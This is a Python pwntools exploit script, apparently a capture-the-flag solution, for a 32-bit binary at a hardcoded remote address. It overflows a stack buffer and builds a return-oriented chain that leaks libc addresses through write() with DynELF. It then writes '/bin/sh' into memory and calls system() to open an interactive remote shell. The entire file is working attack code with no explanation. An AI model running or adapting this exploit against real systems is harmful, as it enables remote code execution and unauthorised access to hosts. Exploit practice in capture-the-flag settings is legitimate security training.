#!/usr/bin/env python
# encoding:utf-8

from utils import *

LIBC_BINSH = 0x00160F58
LIBC_WRITE = 0x000DE420
LIBC_READ = 0x000DE3A0
LIBC_SYSTEM = 0x0003F430
BUF_TO_RET = 0x70
RESTART_ADDR = 0x08048484
FREE_ADDR = 0x0804A048#0x804a020

# context.log_level = 'debug'

elf = ELF('c14595742a95ebf0944804d8853b834c')

io = remote('133.130.111.139', 2333)
# io = remote('10.211.55.48', 2333)
io.recvline()

def leak(address):
    global io
    io.recv(timeout=0.01)
    payload = nops(BUF_TO_RET)
    payload += p32(elf.plt['write']) + p32(RESTART_ADDR)
    payload += p32(1) + p32(address) + p32(4)
    io.send(payload)
    return io.recv(4)

libc = DynELF(leak, elf.entry)

system_addr = libc.lookup('system', 'libc')
# assert system_addr == 0xf7e46360
log.debug('system addr: 0x%08x' % system_addr)

cmd = '/bin/sh\x00'

payload = nops(BUF_TO_RET)
payload += p32(elf.plt['read']) + p32(RESTART_ADDR) + p32(0) + p32(FREE_ADDR) + p32(len(cmd))
io.send(payload)
io.send(cmd)

io.send(nops(BUF_TO_RET) + p32(0x080483D0))

sleep(0.5)

payload = nops(BUF_TO_RET)
payload += p32(system_addr) + p32(RESTART_ADDR) + p32(FREE_ADDR)
io.send(payload)

io.interactive()
